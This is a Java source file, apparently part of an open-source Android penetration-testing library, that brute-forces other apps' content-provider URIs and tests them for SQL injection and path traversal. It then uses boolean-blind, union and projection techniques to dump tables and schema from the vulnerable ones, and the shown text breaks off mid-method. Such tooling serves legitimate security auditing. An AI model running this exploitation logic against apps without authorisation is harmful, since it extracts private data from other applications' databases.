// Copyright (c) 2019-2020 Calum Ewart Hutton
// Distributed under the GNU General Public License v3.0+, see the accompanying
// file LICENSE or https://opensource.org/licenses/GPL-3.0.

package lib.chutchut.cpmap;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.ActivityInfo;
import android.content.pm.ComponentInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PathPermission;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Bundle;
import android.os.PatternMatcher;
import android.util.Log;

import com.google.common.base.CaseFormat;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.Callable;
import java.util.concurrent.CancellationException;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import lib.chutchut.cpmap.payload.BooleanBlindPayload;
import lib.chutchut.cpmap.payload.HeuristicPayload;
import lib.chutchut.cpmap.payload.PathTraversalPayload;
import lib.chutchut.cpmap.payload.ProjectionPayload;
import lib.chutchut.cpmap.payload.SelectionPayload;
import lib.chutchut.cpmap.payload.UnionPayload;
import lib.chutchut.cpmap.payload.base.InjectionPayload;
import lib.chutchut.cpmap.payload.base.Payload;
import lib.chutchut.cpmap.payload.base.UriPathPayload;
import lib.chutchut.cpmap.report.CPAuditReport;
import lib.chutchut.cpmap.report.CPReport;
import lib.chutchut.cpmap.report.CPReportTarget;
import lib.chutchut.cpmap.util.OxfordDictionary;
import lib.chutchut.cpmap.util.Util;
import lib.chutchut.cpmap.vector.CPExploit;
import lib.chutchut.cpmap.vector.CPVector;
import lib.chutchut.cpmap.vector.QueryParser;


public class CPMap {

    private String TAG = "CPMap";
    private Context context;
    private CPReportTarget targetPkg;
    private CPReport targetReport;
    private String stringsPath = null;
    private Bundle options;
    private ArrayList<CPVector> vectors = new ArrayList<>();
    private HashSet<String> invalidAuthorities = new HashSet<>();
    private HashSet<Uri> urisTraversed = new HashSet<>();
    private HashSet<Uri> urisDiscovered = new HashSet<>();
    private HashSet<String> uriFieldBruteHashes = new HashSet<>();
    private Map<CPVector, LinkedHashSet<Payload>> vulnMap = new HashMap<>();
    private Map<String, ProviderInfo> providerMap = new HashMap<>();
    private Map<String, Boolean> vectorPayloadValidationMap = new HashMap<>();
    private HashSet<CPMapLogListener> logListeners = new HashSet<>();
    private CPMapDumpListener dumpListener;
    private CPMapQueryListener queryListener;
    private OxfordDictionary oxfordDictionary;

    private PrintWriter errorLogWriter;
    private boolean errorLogEnable = false;

    public static String[] androidProviders = new String[] {
            "android.support.v4.content.FileProvider",
            "androidx.core.content.FileProvider",
            "com.google.android.gms.measurement.AppMeasurementContentProvider",
            "com.google.firebase.provider.FirebaseInitProvider"
    };

    private static String[] pathWords = new String[] {
            "item",
            "record",
            "path",
            "element",
            "section",
            "shared_prefs",
            "databases"
    };

    private static String[] sqliteDefaultTables = new String[] {
            "sqlite_master",
            "sqlite_sequence",
            "sqlite_stat1",
            "android_metadata" // Android-specific
    };

    private static final int RES_ACTIVITY = 233;
    private static final int RES_PROVIDER = 234;
    private static final int RES_RECEIVER = 235;
    private static final int RES_SERVICE = 236;

    public static final int BNUMTYPE_COUNT = 433;
    public static final int BNUMTYPE_LENGTH = 434;
    public static final int BNUMTYPE_RESULT = 435;

    public static final int TRAVERSAL_PATH_LIMIT = 10;
    public static final int DISCOVER_COLCOND_LIMIT = 50;
    public static final int DISCOVER_BRUTE_PATH_DEPTH = 3;
    public static final int DISCOVER_BRUTE_PATH_LIMIT = 33;
    public static final int DISCOVER_BRUTE_WORD_LIMIT = 1500;
    public static final double DISCOVER_BRUTE_ERR_RATE_LIMIT = 0.9;
    private int CUSTOM_DISCOVER_BRUTE_WORD_LIMIT = -1;
    private int CUSTOM_DISCOVER_BRUTE_PATH_DEPTH = -1;

    public static final String ROW_CONCAT_DELIM = "!!!";
    public static Pattern fullContentUriRegex = Pattern.compile("(content://[^, \\]\\)]+)");

    private class CursorMeta {
        private boolean isNull = true;
        private int numRows = -1;
        private String[] cols = new String[0];

        public CursorMeta(Cursor cursor) {
            if (cursor != null) {
                numRows = cursor.getCount();
                cols = cursor.getColumnNames();
                isNull = false;
            }
        }

        public boolean isNull() {
            return isNull;
        }

        public boolean hasRows() {
            return numRows > 0;
        }

        public int getNumRows() {
            return numRows;
        }

        public String[] getCols() {
            return cols;
        }
    }

    private class QueryResult extends TestResult {
        private CursorMeta cursorMetadata;

        public QueryResult(Cursor cur, CPVector vector, InjectionPayload pl) {
            super(vector, pl, cur != null);
            this.cursorMetadata = new CursorMeta(cur);
        }

        public QueryResult(CursorMeta cur, CPVector vector, InjectionPayload pl) {
            super(vector, pl, cur != null && !cur.isNull());
            this.cursorMetadata = cur != null ? cur : new CursorMeta(null);
        }

        public CursorMeta getCursorMeta() {
            return cursorMetadata;
        }
    }

    private class UpdateResult extends TestResult {
        private int result;

        public UpdateResult(int res, CPVector vector, InjectionPayload pl) {
            super(vector, pl, res >= 0);
            this.result = res;
        }

        public int getResult() {
            return result;
        }
    }

    private class TestResult {
        private boolean status;
        private CPExploit exploit;

        public TestResult(CPVector vector, Payload payload, boolean status) {
            this.exploit = new CPExploit(vector, payload);
            this.status = status;
        }

        public CPVector getVector() {
            return exploit.getVector();
        }

        public Payload getPayload() {
            return exploit.getPayload();
        }

        public boolean getStatus() {
            return status;
        }
    }

    private class ProviderBruteForceCallable implements Callable<List<Uri>> {

        private Uri uri;
        private Set<String> words;
        private ProviderInfo providerInfo;

        public ProviderBruteForceCallable(Uri uri, Set<String> words, ProviderInfo providerInfo) {
            this.uri = uri;
            this.words = words;
            this.providerInfo = providerInfo;
        }

        @Override
        public List<Uri> call() {
            logInf("Spidering base URI (" + uri + ") for further paths..");
            Map<Uri, String[]> bruteRes = bruteUriPaths(uri, words, providerInfo);
            logInf("Finished checking URI: " + uri);
            return new ArrayList<>(bruteRes.keySet());
        }
    }

    private class DexFileStringSearchCallable implements Callable<Set<String>> {

        private File dexFile;

        public DexFileStringSearchCallable(File dexFile) {
            this.dexFile = dexFile;
        }

        @Override
        public Set<String> call() {
            if (dexFile == null || !dexFile.exists()) {
                return null;
            }

            logInf("Extracting strings from file: " + dexFile.getAbsolutePath());
            ArrayList<String> strings = getStringsFromDex(dexFile);
            logInf("Finished extracting strings from file: " + dexFile);
            return new HashSet<>(filterStringsFromDex(strings));
        }

    }

    private class BlindSqlDumpRowCallable implements Callable<BlindSqlDumpRowCallable> {

        private CPVector vector;
        private BooleanBlindPayload payload;
        private String sql;
        private ProviderInfo providerInfo;
        private int rowIndex;
        private String[] row;

        public BlindSqlDumpRowCallable(CPVector vector, BooleanBlindPayload payload, String sql, ProviderInfo providerInfo, int rowIndex) {
            this.vector = vector;
            this.payload = payload;
            this.sql = sql;
            this.providerInfo = providerInfo;
            this.rowIndex = rowIndex;
        }

        @Override
        public BlindSqlDumpRowCallable call() {
            row = getBlindRow(vector, payload, sql, providerInfo, rowIndex);
            return this;
        }

    }

    private class BlindSqlDumpCharCallable implements Callable<BlindSqlDumpCharCallable> {

        private CPVector vector;
        private BooleanBlindPayload payload;
        private String sql;
        private ProviderInfo providerInfo;
        private int charIndex;
        private char chr;

        public BlindSqlDumpCharCallable(CPVector vector, BooleanBlindPayload payload, String sql, ProviderInfo providerInfo, int charIndex) {
            this.vector = vector;
            this.payload = payload;
            this.sql = sql;
            this.providerInfo = providerInfo;
            this.charIndex = charIndex;
        }

        @Override
        public BlindSqlDumpCharCallable call() {
            chr = (char) getBlindNumericVal(vector, payload, sql, providerInfo, BNUMTYPE_RESULT);
            return this;
        }

    }

    public CPMap(Context ctx, Bundle options, String pkgOrUri) {
        this.context = ctx;
        this.options = options;
        String pkg = null;
        if (pkgOrUri.trim().startsWith("content://")) {
            // Lookup ProviderInfo
            ProviderInfo pInf = Util.getProviderInfoByAuthority(Uri.parse(pkgOrUri).getAuthority(), ctx);
            if (pInf != null) {
                pkg = pInf.packageName;
            } else {
                logWarn("Could not find provider info for uri: " + pkgOrUri);
            }
        } else {
            pkg = pkgOrUri;
        }
        if (pkg != null) {
            this.targetPkg = Util.getInstalledTarget(this.context, pkg);
        }
        initVulnMap();
        initOpts();
        initErrorLog();
    }

    public CPMap(Context ctx, Bundle options, Collection<?> urisOrVectors) {
        this.context = ctx;
        this.options = options;
        // Set the target package from the first object, and filter subsequent objects by it
        for (Object uriOrVector : urisOrVectors) {
            if (uriOrVector instanceof CPVector) {
                CPVector inVector = (CPVector) uriOrVector;
                ProviderInfo pInf = Util.getProviderInfoByAuthority(inVector.getUri().getAuthority(), ctx);
                if (pInf == null) {
                    // Ignore vectors with unknown providers
                    logWarn("Could not find provider info for vector: " + inVector);
                    continue;
                } else if (this.targetPkg == null) {
                    this.targetPkg = Util.getInstalledTarget(this.context, pInf.packageName);
                }
                if (this.targetPkg != null && pInf.packageName.equals(this.targetPkg.getTargetPkg())) {
                    this.vectors.add(inVector);
                }
            } else if (uriOrVector instanceof String) {
                String inUri = (String) uriOrVector;
                ProviderInfo pInf = Util.getProviderInfoByAuthority(Uri.parse(inUri).getAuthority(), ctx);
                if (pInf == null) {
                    // Ignore uris with unknown providers
                    logWarn("Could not find provider info for uri: " + inUri);
                    continue;
                } else if (this.targetPkg == null) {
                    this.targetPkg = Util.getInstalledTarget(this.context, pInf.packageName);
                }
                if (this.targetPkg != null && pInf.packageName.equals(this.targetPkg.getTargetPkg())) {
                    ArrayList<CPVector> genVectors = CPVector.getVectorsFromUri(inUri);
                    if (!Util.nullOrEmpty(genVectors)) {
                        this.vectors.addAll(genVectors);
                    }
                }
            }
        }
        initVulnMap();
        initOpts();
        initErrorLog();
    }

    public CPMap(Context ctx, Bundle options, CPReport report) {
        this.context = ctx;
        this.options = options;
        this.targetReport = report;
        this.targetPkg = report.getTarget();
        initVulnMap();
        initOpts();
        initErrorLog();
    }

    public void setLogListener(CPMapLogListener logListener) {
        logListeners.add(logListener);
    }

    public void clearLogListener(CPMapLogListener logListener) {
        logListeners.remove(logListener);
    }

    public void clearLogListeners() {
        logListeners.clear();
    }

    public void setQueryListener(CPMapQueryListener queryListener) {
        this.queryListener = queryListener;
    }

    public void setDumpListener(CPMapDumpListener dumpListener) {
        this.dumpListener = dumpListener;
    }

    private boolean canDump() {

        ArrayList<String> allowedPayloads = new ArrayList<>();
        allowedPayloads.add(BooleanBlindPayload.NAME);
        allowedPayloads.add(UnionPayload.NAME);
        allowedPayloads.add(PathTraversalPayload.NAME);
        allowedPayloads.add(ProjectionPayload.NAME);
        allowedPayloads.add(SelectionPayload.NAME);
        if (getStringOption("dump_payload") != null && !allowedPayloads.contains(getStringOption("dump_payload"))) {
            logErr("Invalid dump_payload selected: " + getStringOption("dump_payload"));
            return false;
        }

        ArrayList<String> allowedVectors = new ArrayList<>();
        allowedVectors.add(CPVector.getTypeString(CPVector.URI_ID));
        allowedVectors.add(CPVector.getTypeString(CPVector.URI_SEGMENT));
        allowedVectors.add(CPVector.getTypeString(CPVector.PROJECTION));
        allowedVectors.add(CPVector.getTypeString(CPVector.WHERE));
        allowedVectors.add(CPVector.getTypeString(CPVector.CVALS_KEY));
        allowedVectors.add(CPVector.getTypeString(CPVector.QPARAM_KEY));
        allowedVectors.add(CPVector.getTypeString(CPVector.QPARAM_VAL));
        if (getStringOption("dump_vector") != null && !allowedVectors.contains(getStringOption("dump_vector"))) {
            logErr("Invalid dump_vector selected: " + getStringOption("dump_vector"));
            return false;
        }

        if (getVectorAndPayloadForDumping(vulnMap) == null) {
            logErr("No dump vectors");
            return false;
        }

        return true;

    }

    public ArrayList<String[]> dump(String sql) {

        if (!canDump()) {
            return null;
        }

        Payload payload = null;
        CPVector dumpVector = null;
        CPExploit vectorPayload = getVectorAndPayloadForDumping(vulnMap);
        if (vectorPayload != null) {
            payload = vectorPayload.getPayload();
            dumpVector = vectorPayload.getVector();
        }

        ArrayList<String[]> dumpRows = null;
        if (payload != null && dumpVector != null) {
            if (dumpVector.getType() == CPVector.PROJECTION) {
                logInf("Got vector (" + dumpVector + ") for dumping");
            } else {
                logInf("Got vector (" + dumpVector + ") and payload (" + payload.getTypeString() + ") for dumping");
            }
            if (dumpListener != null) {
                dumpListener.onVectorPayloadFound(dumpVector, payload);
            }
            logInf("Running custom SQL query: " + sql);
            dumpRows = dumpWithPayload(dumpVector, payload, sql);
            printRows(dumpRows);
        }

        return dumpRows;
    }

    public boolean audit() {

        if (!canDump()) {
            return false;
        }

        if (targetReport == null) {
            logErr("Null report");
            return false;
        }

        CPReportTarget target = targetReport.getTarget();
        if (target == null || target.getTargetPkg() == null || target.getVersion() == null) {
            logErr("Null or invalid target");
            return false;
        }

        if (!Util.pkgVersionisInstalled(context, target.getTargetPkg(), target.getVersion())) {
            logErr("Report package version is not installed: " + target);
            return false;
        }

        /*
         * Audit attempts to identify:
         * - sqlite version for verifcation
         * - accessible tables for each vector
         * - CREATE SQL for each of the accessible tables
         * TODO: custom funcs?
         */

        String sqliteVersion = targetReport.getSqliteVersion();
        HashMap<Integer, HashSet<String>> vectorTableMap = new HashMap<>();
        HashMap<String, String> vectorTableCreateSql = new HashMap<>();

        HashSet<CPVector> reportVectors = targetReport.getVectors();
        for (CPVector vector : reportVectors) {
            // Get a distinct payload for each vector and use it to dump tables accessible via that vector + payload combo
            Payload dumpPayload = getPayloadForDumping(vector);
            if (dumpPayload != null) {

                // Only get the sqlite version if its null already
                if (sqliteVersion == null) {
                    ArrayList<String[]> version = dumpWithPayload(vector, dumpPayload, "SELECT sqlite_version()");
                    if (!Util.nullOrEmpty(version)) {
                        sqliteVersion = version.get(0)[0];
                    } else {
                        // If getting version is unsuccessful, give up on the vector + payload combo
                        continue;
                    }
                }

                int vectorKey = CPAuditReport.getVectorKey(vector);
                if (!vectorTableMap.containsKey(vectorKey)) {
                    vectorTableMap.put(vectorKey, new HashSet<String>());
                }

                // Assume it will have access to same tables as already identified
                if (vector.getTable() != null && vectorTableMap.get(vectorKey).contains(vector.getTable())) {
                    continue;
                }

                // Only get tables (not views etc)
                HashSet<String> auditTables = new HashSet<>();
                ArrayList<String[]> rows = dumpWithPayloadInternal(vector, dumpPayload, "SELECT DISTINCT tbl_name FROM sqlite_master WHERE type = 'table'");
                if (!Util.nullOrEmpty(rows)) {
                    for (String[] row : rows) {
                        String vectorTable = row[0];
                        // Ignore sqlite/android default tables..
                        if (Util.listContains(sqliteDefaultTables, vectorTable, true)) {
                            continue;
                        }
                        auditTables.add(vectorTable);
                    }

                    if (!vectorTableMap.containsValue(auditTables)) {
                        for (String auditTable : auditTables) {
                            // Add the table to the map
                            vectorTableMap.get(vectorKey).add(auditTable);
                            String vectorTableKey = CPAuditReport.getVectorTableKey(vector, auditTable);
                            // Get the CREATE SQL statement for each accessible table
                            if (!vectorTableCreateSql.containsKey(vectorTableKey)) {
                                ArrayList<String[]> createRows = dumpWithPayloadInternal(vector, dumpPayload, String.format("SELECT sql FROM sqlite_master WHERE type = 'table' AND tbl_name = '%s'", auditTable));
                                if (!Util.nullOrEmpty(createRows)) {
                                    vectorTableCreateSql.put(vectorTableKey, createRows.get(0)[0]);
                                }
                            }
                        }
                    } else {
                        // Add all the tables to the map
                        vectorTableMap.get(vectorKey).addAll(auditTables);
                    }
                }
            }
        }

        // Close the error log writer if non null
        if (errorLogWriter != null) {
            errorLogWriter.close();
        }

        // If audit report exists, update it, otherwise create a new instance
        CPAuditReport aReport = new CPAuditReport(vectorTableMap, vectorTableCreateSql);
        if (aReport.getAllAccessibleTables().size() > 0) {
            logInf(aReport.toString());
            if (targetReport.getSqliteVersion() == null && sqliteVersion != null) {
                targetReport.setSqliteVersion(sqliteVersion);
            }
            if (targetReport.getAuditReport() == null) {
                targetReport.setAuditReport(aReport);
            } else {
                targetReport.getAuditReport().update(aReport);
            }
            return Util.saveReport(context, targetReport);
        } else {
            return false;
        }
    }

    private void initErrorLog() {
        if (Util.hasPermission(context, "android.permission.WRITE_EXTERNAL_STORAGE") && errorLogEnable) {
            try {
                errorLogWriter = new PrintWriter(new FileWriter(context.getExternalFilesDir(null) + File.separator + "cpmap_error_log.txt", true), true);
            } catch (IOException ioe) {
                logErr("IOException initialising error log writer: " + ioe.getMessage());
            }
        }
    }

    private void initOpts() {
        Bundle defOpt = getDefaultBundle();
        if (options == null) {
            options = defOpt;
        } else {
            defOpt.putAll(options);
            options = defOpt;
        }
    }

    private void initVulnMap() {

        // Try to load the vectors in the following order
        // Passed in report object
        // Cached

        Map<CPVector, LinkedHashSet<Payload>> cachedVMap = null;
        if (targetReport != null) {
            cachedVMap = loadVectors(targetReport);
            if (cachedVMap != null && cachedVMap.size() > 0) {
                logInf("Loaded report for: " + targetReport.getTarget());
            } else {
                logWarn("Failed to load report for: " + targetReport.getTarget());
            }
        } else if (targetPkg != null && !getBooleanOption("no_cache")) {
            cachedVMap = loadVectors(targetPkg);
        }

        if (cachedVMap != null) {
            vulnMap = cachedVMap;
        }

    }

    public CPReport map() {

        logInf("CPMap options:");
        if (getBooleanOption("heuristic_detection")) {
            logInf("Use heuristic detection methods");
        }

        if (getBooleanOption("blind_detection")) {
            logInf("Use blind detection methods");
        }

        if (getArrayListOption("providers") == null) {
            logInf("Scan all available providers");
        } else {
            logInf("Scan specified providers: " + Util.listToString(getArrayListOption("providers")));
        }

        if (getArrayListOption("permissions") == null) {
            logInf("Scan using all available permissions");
        } else {
            logInf("Scan using specified permissions: " + Util.listToString(getArrayListOption("permissions")));
        }

        if (getArrayListOption("vectors") == null) {
            logInf("Scan all vectors");
        } else {
            logInf("Scan specified vectors: " + Util.listToString(getArrayListOption("vectors")));
        }

        if (getArrayListOption("payloads") == null) {
            logInf("Use all payloads");
        } else {
            logInf("Use specified payloads: " + Util.listToString(getArrayListOption("payloads")));
        }

        if (targetPkg != null && getBooleanOption("refresh_cache")) {
            logWarn("Refreshing vector cache for package: " + targetPkg);
            removeCachedVectors(targetPkg);
            vulnMap.clear();
        }

        if (targetPkg != null && vulnMap.size() > 0 && !getBooleanOption("no_cache") && !getBooleanOption("hide_cached_vector_output")) {
            logInf("Loading " + vulnMap.size() + " cached vectors for package: " + targetPkg);
            for (CPVector vector : vulnMap.keySet()) {
                if (vector.isUpdate() && vector.isQuery()) {
                    logInf("Found query()/update() vector: " + vector);
                } else if (vector.isUpdate()) {
                    logInf("Found update() vector: " + vector);
                } else if (vector.isQuery()) {
                    logInf("Found query() vector: " + vector);
                } else {
                    continue;
                }
                for (Payload payload : vulnMap.get(vector)) {
                    logInf("Payload (" + payload.getTypeString() + "): " + payload.getPayload());
                }
            }
        }

        if (vectors.size() == 0) {
            // Discovery mode, brute force valid vectors
            ArrayList<CPVector> dVectors = discover();
            if (!Util.nullOrEmpty(dVectors)) {
                vectors.addAll(dVectors);
            } else {
                logErr("No discovered vectors");
                return null;
            }
        } else {
            // Validate passed in vectors
            for (CPVector vector : vectors) {
                if (!vector.isValid() || vector.isUnknownType()) {
                    logWarn("Invalid/unknown vector detected: " + vector);
                } else {
                    vectors.add(vector);
                }
            }
        }

        if (vectors.size() > 0) {
            // Load the payloads (only needs to be once) to pass into the test method
            LinkedHashSet<InjectionPayload> injectionPayloads = new LinkedHashSet<>();
            injectionPayloads.addAll((LinkedHashSet<BooleanBlindPayload>) getTestPayloads(BooleanBlindPayload.TYPE));
            injectionPayloads.addAll((LinkedHashSet<ProjectionPayload>) getTestPayloads(ProjectionPayload.TYPE));
            injectionPayloads.addAll((LinkedHashSet<SelectionPayload>) getTestPayloads(SelectionPayload.TYPE));
            injectionPayloads.addAll((LinkedHashSet<UnionPayload>) getTestPayloads(UnionPayload.TYPE));
            LinkedHashSet<UriPathPayload> uriPayloads = new LinkedHashSet<>();
            uriPayloads.addAll((LinkedHashSet<PathTraversalPayload>) getTestPayloads(PathTraversalPayload.TYPE));
            logInf(String.format(Locale.getDefault(), "Starting test of %d vectors with %d payloads (%d Injection / %d Uri Path)", vectors.size(), injectionPayloads.size() + uriPayloads.size(), injectionPayloads.size(), uriPayloads.size()));
            // Create a list of invalid authorities to check
            ArrayList<String> invalidAuths = new ArrayList<>();
            for (CPVector vector : vectors) {
                String authority = vector.getUri().getAuthority();
                if (!invalidAuths.contains(authority)) {
                    ProviderInfo providerInfo = getProviderInfo(authority);
                    if (providerInfo == null) {
                        invalidAuths.add(authority);
                    } else {
                        testVector(vector, providerInfo, injectionPayloads, uriPayloads);
                    }
                }
            }
        } else {
            logErr("No valid vectors");
            return null;
        }

        String sqliteVersionStr = null;
        ArrayList<String[]> versionRows = dump("SELECT sqlite_version()");
        if (!Util.nullOrEmpty(versionRows)) {
            sqliteVersionStr = versionRows.get(0)[0];
            logInf("Got SQLite version: " + sqliteVersionStr);
        } else {
            logWarn("Failed to get SQLite version");
        }

        // If discover mode and vectors found save them for later
        if (targetPkg != null && vulnMap.size() > 0 && targetReport == null) {
            logInf("Saving " + vulnMap.size() + " discovered vectors for package: " + targetPkg);
            if (saveVectors(targetPkg, vulnMap, sqliteVersionStr)) {
                logInf("Save successful");
            } else {
                logWarn("Failed to save vectors");
            }
        }

        // Close the error log writer if non null
        if (errorLogWriter != null) {
            errorLogWriter.close();
        }

        logInf("Test complete");
        return targetPkg != null && vulnMap.size() > 0 ? getReportFromMap(targetPkg, vulnMap, sqliteVersionStr) : null;
    }

    private String getVectorMapKey(CPVector vector) {
        String vectorKey = vector.getTypeString() + "__" + vector.getUri().getAuthority();
        // Distinguish between query/update vectors
        if (vector.isQuery()) {
            vectorKey = "QUERY_" + vectorKey;
        } else {
            vectorKey = "UPDATE_" + vectorKey;
        }
        return vectorKey;
    }

    private boolean shouldTraversePath(CPVector vector) {
        String vectorAuth = Util.getAuthorityFromVector(vector);
        return !invalidAuthorities.contains(vectorAuth);
    }

    private boolean shouldTestVectorForInjection(CPVector vector) {
        // Skip if the vector is null has no table
        if (vector == null) {
            return false;
        }
        // Test every vector if the option is not set
        if (!getBooleanOption("no_duplicate_vectors")) {
            return true;
        }
        if (vulnMap != null) {
            // Make a Map from vuln authorities (prefix vector type) and tables
            Map<String, ArrayList<String>> foundVulnAuthMap = new HashMap<>();
            for (CPVector vulnVector : vulnMap.keySet()) {
                CPReport tmpReport = new CPReport(null, new CPExploit(vulnVector, vulnMap.get(vulnVector)), null);
                // If the report item only has heuristic results, skip it (as it should be tested again)
                if (tmpReport.hasHeuristicOnly()) {
                    continue;
                }
                String vectorKey = getVectorMapKey(vulnVector);
                if (!foundVulnAuthMap.containsKey(vectorKey)) {
                    foundVulnAuthMap.put(vectorKey, new ArrayList<String>());
                }
                // Add tables where injection was found
                if (vector.getIdentifier() != null && !foundVulnAuthMap.get(vectorKey).contains(vector.getIdentifier())) {
                    foundVulnAuthMap.get(vectorKey).add(vector.getIdentifier());
                }
            }
            // Check if the passed vector key and table aleady exists in the map, if it does dont scan it
            String targetVectorKey = getVectorMapKey(vector);
            if (!foundVulnAuthMap.containsKey(targetVectorKey) || !foundVulnAuthMap.get(targetVectorKey).contains(vector.getIdentifier())) {
                // If the existing map does not contain target vector key or table, scan it!
                return true;
            }
        }
        return false;
    }

    private ArrayList<String> getInjectionTables() {
        HashSet<String> tables = new HashSet<>();
        if (vulnMap != null) {
            for (CPVector vector : vulnMap.keySet()) {
                if (vector.getTable() != null) {
                    tables.add(vector.getTable());
                }
            }
        }
        return new ArrayList<>(tables);
    }

    private Payload getPayloadForDumping(CPVector vector) {

        /*
         * Attempt to get a usable payload for dumping, preference:
         * Projection
         * Selection
         * UNION
         * Boolean
         *
         * Validate them first!
         */

        Payload payload = getPayloadOfType(vector, ProjectionPayload.TYPE);
        if (payload != null && validateVector(vector, payload)) {
            return payload;
        }

        payload = getPayloadOfType(vector, SelectionPayload.TYPE);
        if (payload != null && validateVector(vector, payload)) {
            return payload;
        }

        payload = getPayloadOfType(vector, UnionPayload.TYPE);
        if (payload != null && validateVector(vector, payload)) {
            return payload;
        }

        payload = getPayloadOfType(vector, BooleanBlindPayload.TYPE);
        if (payload != null && validateBooleanVector(vector, (BooleanBlindPayload) payload)) {
            return payload;
        }

        return null;
    }

    private CPExploit getVectorAndPayloadForDumping(Map<CPVector, LinkedHashSet<Payload>> vmap) {

        if (vmap != null && vmap.size() > 0) {
            HashSet<CPExploit> exs = new HashSet<>();
            Set<CPVector> vectors = vmap.keySet();
            for (CPVector vector : vectors) {
                Payload payload = getPayloadForDumping(vector);
                if (payload != null) {
                    exs.add(new CPExploit(vector, payload));
                }
            }

            // Get the *best* payload for dumping
            for (CPExploit ex : exs) {
                if (ex.getPayload().getType() == ProjectionPayload.TYPE) {
                    return ex;
                }
            }
            for (CPExploit ex : exs) {
                if (ex.getPayload().getType() == SelectionPayload.TYPE) {
                    return ex;
                }
            }
            for (CPExploit ex : exs) {
                if (ex.getPayload().getType() == UnionPayload.TYPE) {
                    return ex;
                }
            }
            for (CPExploit ex : exs) {
                if (ex.getPayload().getType() == BooleanBlindPayload.TYPE) {
                    return ex;
                }
            }
        }

        return null;
    }

    private ProviderInfo getProviderInfo(String authority) {
        if (providerMap.containsKey(authority)) {
            return providerMap.get(authority);
        } else {
            ProviderInfo pInfo = Util.getProviderInfoByAuthority(authority, context);
            if (pInfo == null) {
                logWarn("Could not find ProviderInfo for authority: " + authority);
                return null;
            }
            providerMap.put(authority, pInfo);
            return pInfo;
        }
    }

    private String[] getFieldsFromCache(CPVector vector, String table) {
        // Check for fields cached in the report
        if (targetReport != null && targetReport.getAuditReport() != null && targetReport.getAuditReport().getVectorTableFields(vector, table) != null) {
            return targetReport.getAuditReport().getVectorTableFields(vector, table).toArray(new String[0]);
        }
        return null;
    }

    private String[] getFieldsFromCursor(CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {
        CursorMeta curMeta = getBaselineQuery(vector, payload, pInfo).getCursorMeta();
        return !curMeta.isNull() ? curMeta.getCols() : null;
    }

    private String[] getFieldsFromSqlCreate(CPVector vector, Payload payload, String table) {
        ArrayList<String> fieldsList = new ArrayList<>();
        String createSql;

        // Check for cached fields
        if (getFieldsFromCache(vector, table) != null) {
            return getFieldsFromCache(vector, table);
        }

        try {
            // Parse the CREATE table statement stored in sqlite_metadata
            ArrayList<String[]> rows = dumpWithPayloadInternal(vector, payload, String.format("SELECT sql FROM sqlite_master WHERE type = 'table' AND tbl_name = '%s'", table));
            if (rows != null && rows.size() > 0) {
                createSql = rows.get(0)[0];
                fieldsList = new QueryParser(createSql).getCols(null);
            }
        } catch (Exception e) {
            logWarn("Exception getting wildcard fields: " + e.getMessage());
            return null;
        }

        return fieldsList.toArray(new String[0]);
    }

    private Uri getInsertUri(CPVector vector, ContentValues vals) {
        try {
            Uri insUri = insert(vector.getUri(), vals);
            // Also validate the returned uri;
            if (insUri != null) {
                return insUri;
            }
        } catch (Exception e) {
            /* TODO: Log this? */
        }
        return null;
    }

    private int canUpdateVectorWithPayload(CPVector vector, BooleanBlindPayload payload) {

        BooleanBlindPayload.Builder builder = new BooleanBlindPayload.Builder(payload, vector);
        try {
            CPVector rendered = builder.getRenderedVector();
            return update(rendered.getUri(), rendered.getValues(), rendered.getWhere(), rendered.getSelectionArgs());
        } catch (Exception e) {
            if (e.getMessage() != null) {
                if (e.getMessage().contains("Cannot bind argument")) {
                    logWarn("'Cannot bind argument' error returned for payload: " + builder.build());
                    if (builder.build().getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                        builder.addPlaceholderCondition();
                        logWarn("'Cannot bind argument' error returned for payload, added condition/placeholder to payload, now: " + builder.build());
                        return canUpdateVectorWithPayload(builder.getVector(), builder.build());
                    } else {
                        logWarn("'Cannot bind argument' error returned for payload, given up adding condition/placeholder to payload :(");
                    }
                } else if (e.getMessage().contains("Too many bind arguments")) {
                    int hasArg = -1;
                    int needArg = -1;
                    Pattern p = Pattern.compile("(\\d+) arguments were provided but the statement needs (\\d+)");
                    Matcher m = p.matcher(e.getMessage());
                    if (m.find()) {
                        hasArg = Integer.parseInt(m.group(1));
                        needArg = Integer.parseInt(m.group(2));
                        if (needArg < hasArg) {
                            /*
                             * Slightly confusing logic..
                             * The error tells us that there are not enough placeholders in the query for args already provided (*not by us..*)
                             * So add some conditions with placeholders to balance the query
                             */
                            int addArg = hasArg - needArg;
                            for (int i = 0; i < addArg; i++) {
                                builder.addPlaceholderCondition();
                            }
                            logWarn("Added " + addArg + " arg(s) to payload for binding, now: " + builder.build());
                            return canUpdateVectorWithPayload(builder.getVector(), builder.build());
                        }
                    }
                } else if (e.getMessage().contains("no such column: rowid")) {
                    // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify the boolBuilder.getVector() in-place and retry
                    logWarn("'no such column: rowid' error returned for boolean update query, probable WITHOUT ROWID table");
                    if (builder.handleWithoutRowid(builder.getVector())) {
                        return canUpdateVectorWithPayload(builder.getVector(), builder.build());
                    }
                } else if (e.getMessage().contains("datatype mismatch")) {
                    // Means the query was valid and record update was attempted, but types didnt match, return 1
                    return 1;
